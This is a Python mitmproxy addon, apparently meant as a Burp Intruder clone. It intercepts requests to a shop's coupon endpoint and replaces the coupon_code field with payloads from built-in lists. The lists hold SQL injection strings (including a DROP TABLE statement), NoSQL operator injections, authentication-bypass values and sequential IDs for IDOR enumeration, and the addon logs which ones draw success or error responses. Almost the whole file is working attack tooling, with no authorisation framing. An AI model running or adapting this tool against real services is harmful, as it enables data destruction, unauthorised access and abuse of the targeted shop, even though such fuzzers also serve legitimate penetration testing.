"""
mitmproxy Intruder equivalent - Automated payload fuzzing
Replicates Burp Intruder's Sniper, Battering Ram, Pitchfork, Cluster Bomb modes

Usage:
    mitmdump -p 8082 -s intruder_addon.py
"""

import mitmproxy.http
from mitmproxy import ctx
import json
import re
import itertools


class Intruder:
    def __init__(self):
        # Target configuration
        self.target_url_pattern = r"/api/shop/apply_coupon"
        self.target_param = "coupon_code"
        self.enabled = False  # Enable when ready to fuzz

        # Attack mode: sniper, battering_ram, pitchfork, cluster_bomb
        self.attack_mode = "sniper"

        # Payload sets
        self.payloads = {
            "sql": [
                "'",
                "''",
                "'--",
                "' OR '1'='1",
                "' OR '1'='1'--",
                "'; DROP TABLE users;--",
                "' UNION SELECT NULL--",
                "1' AND '1'='1",
                "1' AND '1'='2",
            ],
            "nosql": [
                '{"$gt":""}',
                '{"$ne":""}',
                '{"$regex":".*"}',
                '{"$where":"1==1"}',
                '{"$exists":true}',
            ],
            "auth_bypass": [
                "admin",
                "administrator",
                "root",
                "test",
                "admin'--",
                "admin' OR '1'='1",
            ],
            "idor": [str(i) for i in range(1, 101)],  # ID enumeration
        }

        self.current_payload_set = "sql"
        self.payload_index = 0
        self.results = []

    def request(self, flow: mitmproxy.http.HTTPFlow):
        if not self.enabled:
            return

        url = flow.request.pretty_url

        if not re.search(self.target_url_pattern, url):
            return

        if not flow.request.content:
            return

        try:
            body = json.loads(flow.request.content)
        except:
            return

        if self.target_param not in body:
            return

        # Get current payload
        payloads = self.payloads.get(self.current_payload_set, [])
        if self.payload_index >= len(payloads):
            ctx.log.info("[INTRUDER] All payloads exhausted")
            self.enabled = False
            return

        payload = payloads[self.payload_index]
        original_value = body[self.target_param]

        # Inject payload based on attack mode
        if self.attack_mode == "sniper":
            body[self.target_param] = payload
        elif self.attack_mode == "battering_ram":
            # Replace all parameters with same payload
            for key in body:
                if isinstance(body[key], str):
                    body[key] = payload

        flow.request.content = json.dumps(body).encode()

        # Store for result tracking
        flow.metadata["intruder"] = {
            "payload_index": self.payload_index,
            "payload": payload,
            "original": original_value,
        }

        ctx.log.warn(f"[INTRUDER] Payload {self.payload_index}: {payload}")
        self.payload_index += 1

    def response(self, flow: mitmproxy.http.HTTPFlow):
        if "intruder" not in flow.metadata:
            return

        meta = flow.metadata["intruder"]
        result = {
            "payload_index": meta["payload_index"],
            "payload": meta["payload"],
            "status_code": flow.response.status_code,
            "length": len(flow.response.content) if flow.response.content else 0,
            "body_preview": flow.response.content[:200].decode("utf-8", errors="ignore")
            if flow.response.content
            else "",
        }

        self.results.append(result)

        # Highlight interesting responses (different status codes, lengths)
        if flow.response.status_code == 200:
            ctx.log.warn(
                f"[INTRUDER] SUCCESS! Payload: {meta['payload']} -> {flow.response.status_code}"
            )
        elif flow.response.status_code == 500:
            ctx.log.error(
                f"[INTRUDER] ERROR! Payload: {meta['payload']} -> May indicate injection point"
            )

        ctx.log.info(
            f"[INTRUDER] Result: {flow.response.status_code} | Len: {result['length']} | Payload: {meta['payload'][:30]}"
        )


addons = [Intruder()]
